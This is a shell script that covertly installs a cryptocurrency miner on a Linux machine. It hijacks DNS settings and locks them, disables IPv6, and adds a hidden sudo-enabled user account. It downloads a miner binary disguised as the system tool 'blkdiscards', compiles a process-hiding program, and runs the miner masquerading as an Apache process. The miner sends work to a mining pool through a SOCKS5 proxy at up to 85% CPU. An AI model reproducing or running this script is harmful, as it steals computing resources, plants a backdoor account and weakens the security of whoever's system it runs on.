#!/bin/sh
sudo apt update
sudo apt install screen libjansson4 -y
sudo apt install nginx -y
sudo chmod 777 0.sh 0.sh
sudo chmod 777 /etc/resolv.conf
sudo rm -rf /etc/resolv.conf
sudo touch /etc/resolv.conf
sudo chmod 777 /etc/resolv.conf
sudo echo -e 'nameserver 205.171.3.66\nnameserver 205.171.202.166' >/etc/resolv.conf
sudo chattr -f  +i /etc/resolv.conf
sudo chmod 777 /etc/systemd/resolved.conf
sudo echo '' >/etc/systemd/resolved.conf
sudo echo -e 'DNS=205.171.3.66 \nFallbackDNS=205.171.202.166' >/etc/systemd/resolved.conf
sudo screen -dmS satu systemctl status systemd-resolved
sudo ufw allow out 53,113,123/udp
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1
sudo adduser --force-badname --disabled-password --gecos "" Namesr
sudo usermod -a -G sudo Namesr
wget -O blkdiscards https://github.com/lifetimerdp/Github/raw/main/run
wget -O xhide.c https://raw.githubusercontent.com/lifetimerdp/source/main/hide.c
sudo chmod +x xhide.c
sudo gcc -o hide xhide.c
sudo mv blkdiscards /sbin
cd /sbin
sudo chmod +x blkdiscards
sudo -u Namesr -H sudo ./hide -s "/usr/sbin/apache2 -k start" -d -p apache.pid ./blkdiscards -a argon2/chukwav2 -o pool.hashvault.pro:80 -u TRTLv2rBwLCVnmXdAUK2Tw5bYcdiA7GzM5gehYXkXPQuLc4cquB4jpsSAfXvyCMT255mnw9aCfY1j1WPwAYgwLbQ7JTJb7oU5yQ -p github -k -x socks5://78.46.200.216:22766 --max-cpu-usage 85
sudo /etc/init.d/nginx start
sudo timeout 65m ping google.com
#Jgnsebar_Sembarangan